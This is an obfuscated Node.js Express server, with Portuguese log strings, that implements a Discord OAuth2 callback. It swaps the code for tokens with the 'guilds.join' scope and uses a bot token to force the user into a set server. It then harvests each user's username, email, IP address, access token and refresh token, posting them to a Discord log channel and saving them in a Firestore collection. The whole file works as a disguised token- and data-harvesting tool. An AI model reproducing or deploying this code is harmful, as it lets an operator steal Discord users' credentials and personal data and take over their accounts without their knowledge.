const _0x22f737=_0xa8bd;(function(_0x5ebfe3,_0x357c3e){const _0x3db355=_0xa8bd,_0x3f0692=_0x5ebfe3();while(!![]){try{const _0x57b88a=parseInt(_0x3db355(0x1b2))/0x1*(-parseInt(_0x3db355(0x19c))/0x2)+-parseInt(_0x3db355(0x1b7))/0x3*(parseInt(_0x3db355(0x1a5))/0x4)+-parseInt(_0x3db355(0x1ab))/0x5*(-parseInt(_0x3db355(0x19d))/0x6)+-parseInt(_0x3db355(0x1b4))/0x7+parseInt(_0x3db355(0x1c2))/0x8+-parseInt(_0x3db355(0x198))/0x9*(-parseInt(_0x3db355(0x1a3))/0xa)+parseInt(_0x3db355(0x1bf))/0xb;if(_0x57b88a===_0x357c3e)break;else _0x3f0692['push'](_0x3f0692['shift']());}catch(_0x4b65b4){_0x3f0692['push'](_0x3f0692['shift']());}}}(_0x1a27,0xa3cbb),require(_0x22f737(0x1b5))['config']());const express=require(_0x22f737(0x1a4)),axios=require(_0x22f737(0x1c4)),cors=require(_0x22f737(0x1c0)),{initializeApp}=require(_0x22f737(0x1c3)),{getFirestore,collection,addDoc,serverTimestamp}=require(_0x22f737(0x1d8)),app=express(),firebaseConfig={'projectId':process[_0x22f737(0x1c8)]['project_id'],'private_key_id':process[_0x22f737(0x1c8)][_0x22f737(0x1bd)],'private_key':process['env'][_0x22f737(0x1a0)][_0x22f737(0x1d6)](/\\n/g,'\x0a'),'client_email':process[_0x22f737(0x1c8)]['client_email'],'client_id':process[_0x22f737(0x1c8)][_0x22f737(0x1be)],'auth_uri':process['env'][_0x22f737(0x1d5)],'token_uri':process[_0x22f737(0x1c8)][_0x22f737(0x1a9)],'auth_provider_x509_cert_url':process[_0x22f737(0x1c8)][_0x22f737(0x1d3)],'client_x509_cert_url':process[_0x22f737(0x1c8)][_0x22f737(0x1c5)],'universe_domain':process[_0x22f737(0x1c8)][_0x22f737(0x1c6)]},firebaseApp=initializeApp(firebaseConfig),db=getFirestore(firebaseApp),{CLIENT_ID,CLIENT_SECRET,BOT_TOKEN,REDIRECT_URI,GUILD_ID=process[_0x22f737(0x1c8)][_0x22f737(0x1b0)]||process[_0x22f737(0x1c8)]['specialServerId'],LOG_CHANNEL_ID,PORT=0x1f90,FRONTEND_URL}=process[_0x22f737(0x1c8)];app['use'](cors({'origin':FRONTEND_URL,'credentials':!![]})),app['use'](express[_0x22f737(0x1aa)]());function _0x1a27(){const _0x30419b=['stringify','query','token_uri','json','5QmQuPH','status','Dados\x20salvos\x20no\x20Firestore\x20com\x20ID:\x20','https://discord.com/api','error','guildId','toISOString','1309537iAnkOT','/callback','2972543ASSdye','dotenv','connection','543zroXJY','headers','refreshToken','/channels/','type','email','private_key_id','client_id','14816846ErWcia','cors','post','4922912iAXBqi','firebase/app','axios','client_x509_cert_url','universe_domain','/users/@me','env','get','/messages','categoryId','application/x-www-form-urlencoded','accessToken','N/A','users','/?success=true','identify\x20email\x20guilds\x20guilds.join','CÃ³digo\x20ausente','auth_provider_x509_cert_url','Bot\x20','auth_uri','replace','data','firebase/firestore','redirect','send','Erro\x20no\x20callback:','8199kjAzJf','Servidor\x20rodando\x20na\x20porta\x20','user','code','2LbzdSt','4328598OCHCbm','Erro\x20ao\x20enviar\x20dados:','listen','private_key','application/json','message','1290GKSwdR','express','8756GAsQGy','put'];_0x1a27=function(){return _0x30419b;};return _0x1a27();}const discordAPI=_0x22f737(0x1ae);function _0xa8bd(_0x1e30d6,_0x5cf7d8){const _0x1a2791=_0x1a27();return _0xa8bd=function(_0xa8bdf4,_0x491064){_0xa8bdf4=_0xa8bdf4-0x195;let _0x38cdd1=_0x1a2791[_0xa8bdf4];return _0x38cdd1;},_0xa8bd(_0x1e30d6,_0x5cf7d8);}async function sendJSONMessage(_0x4d2546){const _0x11bc9b=_0x22f737;try{LOG_CHANNEL_ID&&await axios[_0x11bc9b(0x1c1)](discordAPI+_0x11bc9b(0x1ba)+LOG_CHANNEL_ID+_0x11bc9b(0x1ca),{'content':JSON[_0x11bc9b(0x1a7)](_0x4d2546)},{'headers':{'Authorization':_0x11bc9b(0x1d4)+BOT_TOKEN,'Content-Type':'application/json'}});const _0xf6a6bc={'username':_0x4d2546[_0x11bc9b(0x19a)],'discordId':_0x4d2546['id'],'email':_0x4d2546[_0x11bc9b(0x1bc)]||'N/A','ipAddress':_0x4d2546['ip'],'accessToken':_0x4d2546[_0x11bc9b(0x1cd)],'refreshToken':_0x4d2546[_0x11bc9b(0x1b9)],'timestamp':serverTimestamp(),'guildId':GUILD_ID};process[_0x11bc9b(0x1c8)]['categoryId']&&(_0xf6a6bc['categoryId']=process['env'][_0x11bc9b(0x1cb)]);process[_0x11bc9b(0x1c8)][_0x11bc9b(0x1bb)]&&(_0xf6a6bc[_0x11bc9b(0x1bb)]=process[_0x11bc9b(0x1c8)][_0x11bc9b(0x1bb)]);const _0x572808=await addDoc(collection(db,_0x11bc9b(0x1cf)),_0xf6a6bc);console['log'](_0x11bc9b(0x1ad),_0x572808['id']);}catch(_0x5d868c){console[_0x11bc9b(0x1af)](_0x11bc9b(0x19e),_0x5d868c[_0x11bc9b(0x1a2)]);}}app[_0x22f737(0x1c9)](_0x22f737(0x1b3),async(_0x577139,_0x13f2ef)=>{const _0xb616fc=_0x22f737,_0x51614b=_0x577139[_0xb616fc(0x1a8)][_0xb616fc(0x19b)],_0x5a467c=_0x577139[_0xb616fc(0x1b8)]['x-forwarded-for']||_0x577139[_0xb616fc(0x1b6)]['remoteAddress'];if(!_0x51614b)return _0x13f2ef[_0xb616fc(0x1ac)](0x190)[_0xb616fc(0x196)](_0xb616fc(0x1d2));try{const _0x255647=await axios[_0xb616fc(0x1c1)](discordAPI+'/oauth2/token',new URLSearchParams({'client_id':CLIENT_ID,'client_secret':CLIENT_SECRET,'grant_type':'authorization_code','code':_0x51614b,'redirect_uri':REDIRECT_URI,'scope':_0xb616fc(0x1d1)}),{'headers':{'Content-Type':_0xb616fc(0x1cc)}}),{access_token:_0x16afd2,refresh_token:_0x488ce3,token_type:_0x3a06a4}=_0x255647[_0xb616fc(0x1d7)],_0x24fd2e=await axios[_0xb616fc(0x1c9)](discordAPI+_0xb616fc(0x1c7),{'headers':{'Authorization':_0x3a06a4+'\x20'+_0x16afd2}}),_0x166bb8=_0x24fd2e['data'];try{await axios[_0xb616fc(0x1a6)](discordAPI+'/guilds/'+GUILD_ID+'/members/'+_0x166bb8['id'],{'access_token':_0x16afd2},{'headers':{'Authorization':_0xb616fc(0x1d4)+BOT_TOKEN,'Content-Type':_0xb616fc(0x1a1)}});}catch(_0x2736b2){console[_0xb616fc(0x1af)]('Erro\x20ao\x20adicionar\x20membro\x20ao\x20servidor:',_0x2736b2['response']?.['data']||_0x2736b2[_0xb616fc(0x1a2)]);}return await sendJSONMessage({'user':_0x166bb8['username'],'id':_0x166bb8['id'],'email':_0x166bb8[_0xb616fc(0x1bc)]||_0xb616fc(0x1ce),'ip':_0x5a467c,'accessToken':_0x16afd2,'refreshToken':_0x488ce3,'timestamp':new Date()[_0xb616fc(0x1b1)]()}),_0x13f2ef['redirect'](FRONTEND_URL+_0xb616fc(0x1d0));}catch(_0x15f12c){return console[_0xb616fc(0x1af)](_0xb616fc(0x197),_0x15f12c['response']?.[_0xb616fc(0x1d7)]||_0x15f12c[_0xb616fc(0x1a2)]),_0x13f2ef[_0xb616fc(0x195)](FRONTEND_URL+'/?error=auth_failed');}}),app[_0x22f737(0x19f)](PORT,()=>{const _0x3e21fb=_0x22f737;console['log'](_0x3e21fb(0x199)+PORT);});
